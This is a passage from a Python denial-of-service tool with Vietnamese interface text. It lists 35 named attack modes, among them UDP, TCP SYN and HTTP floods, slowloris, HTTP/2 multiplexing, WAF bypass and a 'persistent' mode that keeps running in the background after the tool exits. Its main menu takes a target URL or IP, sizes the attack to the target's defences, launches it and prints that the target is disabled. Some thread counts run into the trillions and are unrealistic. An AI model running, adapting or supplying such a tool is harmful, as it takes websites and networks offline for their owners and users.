    {"id": "6", "name": "unlimited", "threads": 10000, "requests": 1000, "desc": "Tấn công luồng không giới hạn", "level": "Trung bình-Cao", "application": "Tấn công liên tục"},
    {"id": "7", "name": "overload429403", "threads": 15000, "requests": 2000, "desc": "Tấn công quá tải nhắm mã 429/403", "level": "Cao", "application": "Hệ thống giới hạn tốc độ"},
    {"id": "8", "name": "blitz522", "threads": 20000, "requests": 3000, "desc": "Tấn công chớp nhoáng nhắm mã 522", "level": "Cao", "application": "Gián đoạn kết nối"},
    {"id": "9", "name": "layer3_4", "threads": 20000, "requests": 5000, "desc": "Tấn công UDP tầng 3/4", "level": "Cao", "application": "Gián đoạn mạng"},
    {"id": "10", "name": "combined", "threads": 25000, "requests": 4000, "desc": "Tấn công kết hợp mọi kỹ thuật", "level": "Cao", "application": "Mục tiêu phức tạp"},
    {"id": "11", "name": "layer7", "threads": 25000, "requests": 4000, "desc": "Tấn công tầng 7 nhắm ứng dụng web", "level": "Cao", "application": "Quá tải ứng dụng web"},
    {"id": "12", "name": "multi_vector", "threads": 30000, "requests": 6000, "desc": "Tấn công đa vector kết hợp mọi kỹ thuật", "level": "Rất Cao", "application": "Mục tiêu quy mô lớn"},
    {"id": "13", "name": "god", "threads": 30000, "requests": 1000, "desc": "Tấn công cấp thần với 30K luồng", "level": "Rất Cao", "application": "Mục tiêu bảo mật cao"},
    {"id": "14", "name": "hyper", "threads": 10000000, "requests": 1000, "desc": "Tấn công siêu tốc với 10M luồng", "level": "Cực Cao", "application": "Hệ thống lớn"},
    {"id": "15", "name": "supra", "threads": 20000000, "requests": 1000, "desc": "Tấn công tối cao với 20M luồng", "level": "Cực Cao", "application": "Mục tiêu siêu lớn"},
    {"id": "16", "name": "pulsar", "threads": 30000000, "requests": 1000, "desc": "Tấn công Pulsar với 30M luồng", "level": "Cực Cao", "application": "Hệ thống phân tán"},
    {"id": "17", "name": "quasar", "threads": 35000000, "requests": 1000, "desc": "Tấn công Quasar với 35M luồng", "level": "Cực Cao", "application": "Hệ thống CDN"},
    {"id": "18", "name": "prime", "threads": 50000000, "requests": 1000, "desc": "Tấn công Prime với 50M luồng", "level": "Cực Cao", "application": "Hệ thống tải cao"},
    {"id": "19", "name": "cosmic", "threads": 60000000, "requests": 1000, "desc": "Tấn công Cosmic với 60M luồng", "level": "Cực Cao", "application": "Hệ thống quy mô lớn"},
    {"id": "20", "name": "ultima", "threads": 100000000, "requests": 1000, "desc": "Tấn công tối thượng với 100M luồng", "level": "Cực Cao", "application": "Hệ thống doanh nghiệp"},
    {"id": "21", "name": "nova", "threads": 100000000, "requests": 1000, "desc": "Tấn công Supernova với 100M luồng", "level": "Cực Cao", "application": "Hệ thống tải cực lớn"},
    {"id": "22", "name": "titan", "threads": 5000000, "requests": 1000, "desc": "Tấn công Titan với 5M luồng", "level": "Cực độ", "application": "Hệ thống siêu lớn"},
    {"id": "23", "name": "void", "threads": 234000000, "requests": 1000, "desc": "Tấn công Void với 234M luồng", "level": "Cực độ", "application": "Mục tiêu siêu bền"},
    {"id": "24", "name": "abyss", "threads": 700000000, "requests": 1000, "desc": "Tấn công Abyss với 700M luồng", "level": "Cực độ", "application": "Hệ thống cấp quốc gia"},
    {"id": "25", "name": "omega", "threads": 1000000000, "requests": 1000, "desc": "Tấn công Omega với 1B luồng", "level": "Cực độ", "application": "Hệ thống siêu bảo mật"},
    {"id": "26", "name": "giga", "threads": 1000000000000, "requests": 1000, "desc": "Tấn công Giga với 1T luồng", "level": "Tối đa", "application": "Hệ thống toàn cầu"},
    {"id": "27", "name": "persistent", "threads": 1000000000000, "requests": 10000, "desc": "Tấn công liên tục không ngừng", "level": "Tối đa", "application": "Tấn công không ngừng"},
    {"id": "28", "name": "http2_multiplex", "threads": 10000, "requests": 1000, "desc": "Tấn công HTTP/2 multiplexing", "level": "Cao", "application": "Máy chủ hỗ trợ HTTP/2"},
    {"id": "29", "name": "keep_alive_pipeline", "threads": 10000, "requests": 1000, "desc": "Tấn công Keep-Alive + Pipelining", "level": "Cao", "application": "Máy chủ HTTP"},
    {"id": "30", "name": "multiprocessing", "threads": 20000, "requests": 2000, "desc": "Tấn công đa tiến trình", "level": "Cao", "application": "Tấn công hiệu suất cao"},
    {"id": "31", "name": "multi_async", "threads": 20000, "requests": 2000, "desc": "Tấn công đa tiến trình + bất đồng bộ", "level": "Cao", "application": "Tấn công bất đồng bộ hiệu suất cao"},
    {"id": "32", "name": "udp_flood", "threads": 20000, "requests": 5000, "desc": "Tấn công UDP tầng 4", "level": "Cao", "application": "Tấn công mạng không cần phản hồi"},
    {"id": "33", "name": "waf_bypass", "threads": 25000, "requests": 4000, "desc": "Tấn công tầng 7 vượt qua WAF/DDoS", "level": "Cao", "application": "Bypass tường lửa ứng dụng web"},
    {"id": "34", "name": "tcp_udp_flood", "threads": 25000, "requests": 5000, "desc": "Tấn công TCP/UDP tầng 4", "level": "Cao", "application": "Tấn công mạng trực tiếp"},
    {"id": "35", "name": "ultimate_x", "threads": 30000, "requests": 6000, "desc": "Tấn công cấp 3 năng thành: Băng thông, Giao thức, Tầng ứng dụng", "level": "Rất Cao", "application": "Mục tiêu đa tầng"}
]

# Display ordered functions
def display_ordered_functions():
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}{Style.BRIGHT}35+ CHIẾN LƯỢC TẤN CÔNG (Sắp xếp theo Cường độ){Style.RESET_ALL}{Fore.RESET}\n")
    for idx, func in enumerate(TARGET_CONFIGS, 1):
        print(f"{Fore.YELLOW}{idx}. {func['name'].upper():<20} (ID: {func['id']})")
        print(f"   - Mô tả: {func['desc']}")
        print(f"   - Luồng: {func['threads']:,}")
        print(f"   - Yêu cầu/Luồng: {func['requests']:,}")
        print(f"   - Tổng lượt đánh: {func['threads'] * func['requests']:,}")
        print(f"   - Cấp độ: {func['level']}")
        print(f"   - Ứng dụng: {func['application']}{Fore.RESET}\n")
    input(f"{Fore.CYAN}Nhấn Enter để trở về menu chính...{Fore.RESET}")

# Display target menu
def display_target_menu():
    clear_screen()
    display_banner()
    print(f"{Fore.YELLOW}0. Xem danh sách chiến lược tấn công{Fore.RESET}")
    for target in TARGET_CONFIGS:
        print(f"{Fore.YELLOW}{target['id']}. {target['name'].upper():<20} - {target['desc']}{Fore.RESET}")
    print(f"{Fore.CYAN}═══════════════════════════════{Fore.RESET}")

# Display sub-menu for Ultimate-X attack
def display_ultimate_x_menu():
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}{Style.BRIGHT}CHỌN LOẠI TẤN CÔNG ULTIMATE-X{Style.RESET_ALL}{Fore.RESET}")
    print(f"{Fore.YELLOW}1. Tấn công băng thông (UDP/ICMP Flood){Fore.RESET}")
    print(f"{Fore.YELLOW}2. Tấn công giao thức (TCP SYN/ACK/RST Flood){Fore.RESET}")
    print(f"{Fore.YELLOW}3. Tấn công tầng ứng dụng (HTTP Flood + WAF Bypass){Fore.RESET}")
    print(f"{Fore.CYAN}═══════════════════════════════{Fore.RESET}")

# Main function
def main():
    check_file_integrity()
    multiprocessing.set_start_method('spawn')
    while True:
        try:
            if not validate_key():
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Hủy tấn công - Xác thực thất bại{Style.RESET_ALL}{Fore.RESET}")
                exit(1)

            display_target_menu()
            choice = input(f"{Fore.CYAN}Nhập lựa chọn (0-35): {Fore.RESET}").strip()

            if choice == "0":
                display_ordered_functions()
                continue

            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
            if not target:
                print(f"{Fore.RED}[LỖI] Lựa chọn không hợp lệ! Thử lại.{Fore.RESET}")
                time.sleep(1)
                continue
            target_selection_effect(target['name'])

            base_threads = target['threads']
            base_requests = target['requests']

            if target['name'] == "persistent":
                print(f"{Fore.RED}{Style.BRIGHT}[CẢNH BÁO] Tấn công sẽ chạy nền kể cả sau khi thoát công cụ!{Style.RESET_ALL}{Fore.RESET}")
                print(f"{Fore.YELLOW}Để dừng: Dùng 'killall python3' (Linux/Termux) hoặc Task Manager (Windows){Fore.RESET}")

            if target['name'] == "ultimate_x":
                display_ultimate_x_menu()
                attack_choice = input(f"{Fore.CYAN}Chọn loại tấn công (1-3): {Fore.RESET}").strip()
                if attack_choice not in ["1", "2", "3"]:
                    print(f"{Fore.RED}[LỖI] Lựa chọn không hợp lệ! Thử lại.{Fore.RESET}")
                    time.sleep(1)
                    continue

            input_url = input(f"{Fore.CYAN}Nhập URL hoặc IP mục tiêu: {Fore.WHITE}").strip()
            if not input_url:
                print(f"{Fore.RED}[LỖI] URL/IP không được để trống! Thử lại.{Fore.RESET}")
                time.sleep(1)
                continue

            # Validate URL or IP
            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
            except ValueError:
                host = input_url  # Assume it's an IP if URL validation fails
                port = 80
                validated_url = f"http://{host}"
                print(f"{Fore.YELLOW}[HỆ THỐNG] Xử lý mục tiêu như IP: {host}{Fore.RESET}")

            print(f"{Fore.YELLOW}{Style.BRIGHT}[HỆ THỐNG] Mục tiêu đã khóa: {validated_url}{Style.RESET_ALL}{Fore.RESET}")

            if target['name'] not in ("infinite", "unlimited", "overload429403", "blitz522", "combined", "persistent", "layer3_4", "multi_vector", "layer7", "http2_multiplex", "keep_alive_pipeline", "multiprocessing", "multi_async", "udp_flood", "waf_bypass", "tcp_udp_flood", "ultimate_x"):
                confirm = input(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Xác nhận tấn công (y/n): {Style.RESET_ALL}{Fore.RESET}").lower().strip()
                if confirm != 'y':
                    print(f"{Fore.YELLOW}{Style.BRIGHT}[HỆ THỐNG] Hủy tấn công{Fore.RESET}")
                    continue

            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)

            if security_level == "THẤP":
                NUM_THREADS = min(recommended_threads, base_threads // 2)
                REQUESTS_PER_THREAD = min(recommended_requests, base_requests // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "TRUNG BÌNH":
                NUM_THREADS = base_threads
                REQUESTS_PER_THREAD = base_requests
                attack_strategy = "LỰC LƯỢNG VỪA PHẢI"
            else:
                NUM_THREADS = max(recommended_threads, base_threads)
                REQUESTS_PER_THREAD = max(recommended_requests, base_requests)
                attack_strategy = "LỰC LƯỢNG TỐI ĐA"

            print(f"""
{Fore.CYAN}{Style.BRIGHT}
[+] CHIẾN LƯỢC TẤN CÔNG: {target['name'].upper()}
[+] Mục tiêu: {validated_url}
[+] Luồng: {NUM_THREADS:,}
[+] Yêu cầu/Luồng: {REQUESTS_PER_THREAD:,}
[+] Chiến lược: {attack_strategy}
[+] Tổng lượt đánh: {NUM_THREADS * REQUESTS_PER_THREAD:,}
{Style.RESET_ALL}{Fore.RESET}
            """)
            print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Khởi động tấn công...{Style.RESET_ALL}{Fore.RESET}")

            start_time = time.time()

            if target['name'] == "persistent":
                save_attack_config(validated_url, NUM_THREADS, REQUESTS_PER_THREAD, target['name'])
                processes = []
                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):
                    p = multiprocessing.Process(target=persistent_attack_process, args=(validated_url, REQUESTS_PER_THREAD))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Tấn công liên tục bắt đầu với {len(processes)} tiến trình! Dùng 'killall python3' hoặc Task Manager để dừng.{Style.RESET_ALL}{Fore.RESET}")
                time.sleep(2)
                exit(0)
            elif target['name'] == "unlimited":
                unlimited_thread = threading.Thread(target=unlimited_threads_attack, args=(validated_url,))
                unlimited_thread.start()
                try:
                    unlimited_thread.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công vô hạn bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "overload429403":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=overload_429_403_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công quá tải 429/403 bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "blitz522":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=blitz_522_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công chớp nhoáng 522 bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "combined":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=combined_all_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công kết hợp bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "layer3_4":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=layer3_4_attack, args=(host, port, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công tầng 3/4 bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "multi_vector":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=multi_vector_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công đa vector bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "layer7":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=layer7_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công tầng 7 bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "http2_multiplex":
                if not HTTP2_AVAILABLE:
                    print(f"{Fore.RED}[LỖI] Tấn công HTTP/2 bị vô hiệu hóa: Chưa cài đặt module 'h2'{Fore.RESET}")
                    time.sleep(1)
                    continue
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=http2_multiplexing_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công HTTP/2 multiplexing bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "keep_alive_pipeline":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=keep_alive_pipelining_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công Keep-Alive + Pipelining bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "multiprocessing":
                processes = []
                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):
                    p = multiprocessing.Process(target=multiprocessing_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                try:
                    for p in processes:
                        p.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công đa tiến trình bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "multi_async":
                processes = []
                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):
                    p = multiprocessing.Process(target=multiprocessing_async_wrapper, args=(validated_url, REQUESTS_PER_THREAD))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                try:
                    for p in processes:
                        p.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công đa tiến trình + bất đồng bộ bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "udp_flood":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=udp_flood_attack, args=(host, port))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công UDP flood bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "waf_bypass":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=layer7_waf_bypass_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công vượt WAF bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "tcp_udp_flood":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=layer4_tcp_udp_flood, args=(host, port))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công TCP/UDP flood bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "ultimate_x":
                if attack_choice == "1":
                    threads = []
                    for _ in range(NUM_THREADS):
                        t = threading.Thread(target=volumetric_attack, args=(host, port))
                        threads.append(t)
                        t.start()
                    try:
                        for t in threads:
                            t.join()
                    except KeyboardInterrupt:
                        print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công băng thông bị dừng bởi người dùng{Fore.RESET}")
                        exit(0)
                elif attack_choice == "2":
                    threads = []
                    for _ in range(NUM_THREADS):
                        t = threading.Thread(target=protocol_attack, args=(host, port))
                        threads.append(t)
                        t.start()
                    try:
                        for t in threads:
                            t.join()
                    except KeyboardInterrupt:
                        print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công giao thức bị dừng bởi người dùng{Fore.RESET}")
                        exit(0)
                else:  # attack_choice == "3"
                    threads = []
                    for _ in range(NUM_THREADS):
                        t = threading.Thread(target=application_layer_attack, args=(validated_url,))
                        threads.append(t)
                        t.start()
                    try:
                        for t in threads:
                            t.join()
                    except KeyboardInterrupt:
                        print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công tầng ứng dụng bị dừng bởi người dùng{Fore.RESET}")
                        exit(0)
            else:
                while True:
                    slowloris_thread = threading.Thread(target=slowloris_attack, args=(validated_url, 30))
                    flood_thread = threading.Thread(target=http_flood_attack, args=(validated_url, NUM_THREADS * 2))
                    slowloris_thread.start()
                    flood_thread.start()

                    threads = []
                    for _ in range(NUM_THREADS):
                        t = threading.Thread(target=send_request, args=(validated_url, REQUESTS_PER_THREAD))
                        threads.append(t)
                        t.start()

                    for t in threads:
                        t.join()

                    slowloris_thread.join()
                    flood_thread.join()

                    print(f"{Fore.YELLOW}[HỆ THỐNG] Chu kỳ tấn công vô hạn: Tiếp tục...{Fore.RESET}")
                    time.sleep(1)

            end_time = time.time()
            total_time = end_time - start_time

            with manager:
                if response_times:
                    avg_response_time = sum(response_times) / len(response_times)
                    max_response_time = max(response_times)
                    min_response_time = min(response_times)
                else:
                    avg_response_time = 0
                    max_response_time = 0
                    min_response_time = 0

            print(f"""
{Fore.CYAN}{Style.BRIGHT}
[+] BÁO CÁO CHIẾN DỊCH: {target['name'].upper()}
[+] Tổng lượt đánh: {(NUM_THREADS * REQUESTS_PER_THREAD):,}
[+] Thành công: {success_count:,} ({success_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%)
[+] Thất bại: {error_count:,} ({error_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%)
[+] Tổng thời gian: {total_time:.2f} giây
[+] Thời gian phản hồi trung bình: {avg_response_time:.2f}ms
[+] Hiệu suất đỉnh: {max_response_time:.2f}ms
[+] Độ trễ tối thiểu: {min_response_time:.2f}ms
[+] Lượt đánh/giây: {(NUM_THREADS * REQUESTS_PER_THREAD)/total_time:.0f}
[+] MỤC TIÊU BỊ VÔ HIỆU HÓA!
{Style.RESET_ALL}{Fore.RESET}
            """)

        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}{Style.BRIGHT}[HỆ THỐNG] Tấn công bị dừng bởi người dùng{Style.RESET_ALL}{Fore.RESET}")
            exit(0)
        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Lỗi nghiêm trọng: {str(e)}{Style.RESET_ALL}{Fore.RESET}")
            exit(1)

if __name__ == "__main__":
    main()